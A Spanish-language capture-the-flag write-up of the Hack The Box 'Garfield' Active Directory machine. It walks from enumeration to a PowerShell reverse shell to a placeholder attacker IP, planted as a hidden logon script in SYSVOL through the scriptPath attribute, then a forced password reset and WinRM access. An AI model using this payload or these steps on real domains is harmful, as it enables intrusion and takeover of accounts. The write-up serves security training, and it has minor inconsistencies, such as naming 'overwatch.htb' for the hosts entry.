# HTB Garfield: Writeup completo

---

## 1. Información inicial

La máquina corresponde a un entorno de **Active Directory** con un controlador de dominio identificado como `DC01.garfield.htb`. Durante el reconocimiento se observan servicios típicos de un dominio Windows, incluyendo DNS, Kerberos, LDAP, SMB, RDP y WinRM.


---

Primero se agrega el dominio de la máquina al archivo `/etc/hosts`. Esto permite referenciar la IP objetivo usando el nombre `overwatch.htb`.

```bash
echo "<IP> garfield.htb" | sudo tee -a /etc/hosts
```

---

## 2. Recolección de información

Se ejecuta un escaneo agresivo con Nmap:

#### Descubrimiento rápido de puertos TCP

```bash
sudo nmap -p- --open -Pn --min-rate 5000 -oA ports -vvv garfield.htb
```

**Explicación:**

- `-p-`: escanea todos los puertos TCP.
- `--open`: muestra solo puertos abiertos.
- `-Pn`: evita descubrimiento por ping.
- `--min-rate 5000`: acelera el escaneo enviando paquetes a una tasa mínima.
- `-oA ports`: guarda resultados en varios formatos con nombre base `ports`.
- `-vvv`: aumenta el nivel de detalle en pantalla.

#### Detección de versiones y scripts básicos

```bash
grep -oP '\d+/open' ports.gnmap | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//' > ports.txt
```
```bash
sudo nmap -sCV -p$(cat ports.txt) -Pn -oA scan -vvv garfield.htb
```

Resultado relevante:

```text
PORT     STATE SERVICE    VERSION
53/tcp   open  tcpwrapped
88/tcp   open  tcpwrapped
135/tcp  open  tcpwrapped
139/tcp  open  tcpwrapped
389/tcp  open  tcpwrapped
445/tcp  open  tcpwrapped
464/tcp  open  tcpwrapped
593/tcp  open  tcpwrapped
636/tcp  open  tcpwrapped
2179/tcp open  tcpwrapped
3268/tcp open  tcpwrapped
3269/tcp open  tcpwrapped
3389/tcp open  tcpwrapped
5985/tcp open  tcpwrapped
```

Información identificada:

- Sistema altamente probable: **Windows Server 2019 / Windows 10**, versión `10.0.17763`.
- Controlador de dominio: `DC01.garfield.htb`.
- Dominio DNS: `garfield.htb`.
- Nombre NetBIOS del dominio: `GARFIELD`.
- El puerto `5985` indica posible administración remota mediante **WinRM**.
- El servicio SMB tiene la firma habilitada y requerida, por lo que un ataque clásico de SMB Relay sería más difícil.
- La información de RDP/NTLM revela nombre del equipo, dominio y versión del sistema.
- Existe una diferencia aproximada de 8 horas entre el reloj local y el sistema objetivo.

Servicios importantes:

| Puerto | Servicio | Descripción |
|---:|---|---|
| 53 | DNS | Resolución de nombres del dominio |
| 88 | Kerberos | Autenticación Kerberos |
| 135 / 139 / 445 | RPC / SMB | Comunicación Windows y compartidos |
| 389 / 636 | LDAP / LDAPS | Directorio activo |
| 464 | Kerberos password change | Cambio de contraseña Kerberos |
| 3268 / 3269 | Global Catalog | Servicios de Active Directory |
| 3389 | RDP | Escritorio remoto |
| 5985 | WinRM | Administración remota por HTTP |

Conclusión inicial: el objetivo es un **controlador de dominio Active Directory**.

---

## 3. Enumeración SMB con credenciales

Con credenciales del usuario `j.arbuckle`, se enumeran recursos compartidos y usuarios mediante NetExec:

```bash
nxc smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares
```
```bash
nxc smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users
```

Durante la enumeración se identifican usuarios como:

- `l.wilson`
- `l.wilson_adm`

---

## 4. Enumeración de objetos modificables en Active Directory

Se utiliza `bloodyAD` para listar objetos del dominio sobre los cuales el usuario actual tiene permisos de escritura o modificación:

```bash
bloodyAD --host garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable
```

Hallazgos:

- El usuario `j.arbuckle` tiene permisos modificables sobre `l.wilson` y `l.wilson_adm`.
- Esto sugiere la posibilidad de alterar propiedades de esos usuarios.
- También se observa capacidad de crear subobjetos en zonas DNS como `garfield.htb` y `_msdcs.garfield.htb`.

Esto puede estar relacionado con abuso de **ADIDNS/WPAD hijacking**, una técnica clásica de abuso de registros DNS dentro de Active Directory.

---

## 5. Intento de cambio de contraseña

Se intenta modificar la contraseña de `l.wilson`:

```bash
bloodyAD --host garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set password l.wilson 'NewPass@123!'
```

El intento no funciona porque el usuario `j.arbuckle` tiene permiso genérico de escritura sobre el objeto, pero no cuenta con el permiso específico para cambiar o resetear la contraseña.

Conclusión: esta vía no permite tomar control directamente mediante cambio de contraseña.

---

## 6. Revisión de SYSVOL

El usuario actual tiene permisos de lectura sobre `SYSVOL`. Se accede al recurso compartido:

```bash
smbclient //<IP>/SYSVOL -U 'j.arbuckle'
```

Dentro de `smbclient`:

```text
cd garfield.htb\scripts
ls
```

La ruta `scripts` corresponde al directorio típico donde pueden almacenarse scripts de inicio de sesión del dominio.

Idea de explotación: escribir un script en el directorio de scripts de inicio de sesión y modificar el atributo `scriptPath` de un usuario para que ejecute dicho script al iniciar sesión.

---

## 7. Explotación inicial

### 7.1 Generar payload PowerShell

En Linux se genera un payload de reverse shell en PowerShell codificado en Base64 UTF-16LE (<BASE64_PAYLOAD>):

```bash
echo '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<port>);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback=(iex $data 2>&1|Out-String);
$sendback2=$sendback+"PS "+(pwd).Path+"> ";
$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
$client.Close()' | iconv -t UTF-16LE | base64 -w0
```

> Nota: reemplazar la IP y el puerto por los valores correspondientes del laboratorio.

### 7.2 Crear archivo BAT

Se crea un archivo `printerDetect.bat` que ejecuta el payload:

```bash
cat > printerDetect.bat << 'BAT'
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64_PAYLOAD>
BAT
```

### 7.3 Subir el BAT a SYSVOL

```bash
smbclient //<IP>/SYSVOL -U 'j.arbuckle'
```

Dentro de `smbclient`:

```text
cd garfield.htb\scripts
put printerDetect.bat printerDetect.bat
dir
exit
```

### 7.4 Escuchar desde Linux

Se configura la escucha:

```bash
nc -lvnp 4444
```

### 7.5 Modificar `scriptPath` del usuario Liz Wilson

Se configura el atributo `scriptPath` para que el usuario `Liz Wilson` ejecute `printerDetect.bat` al iniciar sesión:

```bash
bloodyAD --host garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
scriptPath -v printerDetect.bat
```

Cuando se activa la ejecución del script, se obtiene una shell como `l.wilson`.

---

## 8. Movimiento lateral: de `l.wilson` a `l.wilson_adm`

Una vez obtenida shell como `l.wilson`, se busca escalar hacia `l.wilson_adm`.

Desde PowerShell se resetea la contraseña del usuario administrador relacionado:

```powershell
Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword (ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force) -Reset
```

Se valida el acceso por WinRM:

```bash
nxc winrm garfield.htb -u 'l.wilson_adm' -p 'WhoKnows123!'
```

Si la validación es correcta, se obtiene shell interactiva:

```bash
evil-winrm -i garfield.htb -u l.wilson_adm -p 'WhoKnows123!'
```

### 8.1 Obtención de la bandera del user.txt

<img width="731" height="313" alt="Screenshot 2026-06-28 at 08 26 32" src="https://github.com/user-attachments/assets/e82f8612-1ccd-47d3-bb4c-ce6d75e08615" />

